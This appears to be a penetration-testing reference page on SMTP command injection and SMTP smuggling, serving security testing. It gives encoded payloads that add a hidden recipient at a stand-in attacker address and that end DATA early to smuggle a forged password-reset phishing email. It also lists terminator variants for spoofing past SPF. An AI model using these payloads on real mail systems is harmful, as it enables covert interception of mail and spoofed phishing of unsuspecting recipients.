---
title: "SMTP segment injection: injecting into the raw SMTP conversation"
description: "Where an app speaks raw SMTP, injecting into MAIL FROM, RCPT TO, or DATA to add recipients, rewrite the envelope, or terminate DATA early with a lone dot and smuggle a second message."
keywords:
  - SMTP injection
  - SMTP command injection
  - SMTP smuggling
  - MAIL FROM
  - RCPT TO
  - message smuggling
---

# SMTP segment injection

When an application speaks SMTP directly, building `MAIL FROM`, `RCPT TO`, or the `DATA` payload from user input, a `CRLF` in that input ends the current SMTP line and lets the attacker issue their own commands or forge the envelope. Unlike header injection, which manipulates the message, this manipulates the protocol conversation between the application and its mail server.

## The command grammar

SMTP is line-oriented: each command is one `CRLF`-terminated line. A transaction runs `MAIL FROM:<sender>`, one or more `RCPT TO:<recipient>`, then `DATA`, the message, and a line containing only a single dot (`.`) to end it. Any field concatenated into one of these lines without stripping `CRLF` lets the attacker inject the next line of the dialogue.

## Adding recipients and rewriting the envelope

If a recipient or sender field flows into the command line, inject a `CRLF` and a further `RCPT TO` to add a hidden recipient at the envelope level, independent of any header:

```
victim@corp.test%0d%0aRCPT TO:<collector@evil.test>
```

The server accepts both recipients; the extra one appears nowhere in the message headers the real recipient sees. Injecting `MAIL FROM` rewrites the envelope sender (the bounce address and the value many filters evaluate for SPF), letting the attacker forge the return path while the visible `From:` header stays untouched.

## Terminating DATA early and smuggling a second message

The strongest primitive is reaching the `DATA` payload. The message is terminated by the five bytes `CRLF . CRLF` (`%0d%0a.%0d%0a`). Injecting that sequence ends the current message, returns the session to command mode, and lets the attacker start a brand-new transaction over the same connection:

```
%0d%0a.%0d%0aMAIL FROM:<forged@corp.test>%0d%0aRCPT TO:<target@victim.test>%0d%0aDATA%0d%0aFrom: it@corp.test%0d%0aSubject: Password reset%0d%0a%0d%0aClick https://evil.test%0d%0a.%0d%0a
```

The first message closes at the injected dot; everything after it is a second, fully attacker-authored email sent from the trusted application's connection and IP.

## SMTP smuggling at the hand-off

A related desynchronization exploits disagreement over what ends `DATA`. The standard terminator is `<CR><LF>.<CR><LF>`, but some servers also accept non-standard variants such as a bare `<LF>.<LF>`, `<CR>.<CR>`, or `<LF>.<CR><LF>`. When an outbound (sending) server and an inbound (receiving) server disagree on which sequences count, a crafted body that one treats as data and the other treats as the end-of-data marker splits into two messages at different points for the two hops. The attacker appends a smuggled message whose envelope the receiving server processes separately, enabling spoofed mail that passes **SPF** for the spoofed sender domain and therefore DMARC via SPF alignment (the message is relayed by a server the spoofed domain's SPF authorizes). DKIM is not satisfied, since the attacker cannot produce a valid signature for the spoofed domain, which is exactly why the targets are domains that pass DMARC on SPF alone. Candidate terminators to probe:

```
%0a.%0a
%0d.%0d
%0a.%0d%0a
```

## Delivery notes

- The injected bytes must survive to the SMTP line as real `CR`/`LF`; from a web request that is `%0d%0a`, in JSON `\r\n`.
- Addresses in commands are wrapped in angle brackets (`<addr>`); match the server's expected syntax or the injected command is rejected.
- Pipelining tolerance varies; if the server rejects commands sent before it replies, pace the injection to the responses.
- Envelope recipients added via `RCPT TO` leave no header trace, which is what makes this distinct from a `Bcc:` added through header injection.

## Tools

- **swaks**: Swiss Army Knife for SMTP, scripting crafted envelopes and DATA payloads.
- **Burp Repeater**: injecting CRLF and SMTP command payloads into mail fields.
- **curl**: sending crafted CRLF payloads into mail-composition fields.
- Manual testing with Burp Repeater and crafted payloads.

## References

- [OWASP: Testing for IMAP SMTP Injection (WSTG)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_IMAP_SMTP_Injection)
- [PayloadsAllTheThings: CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
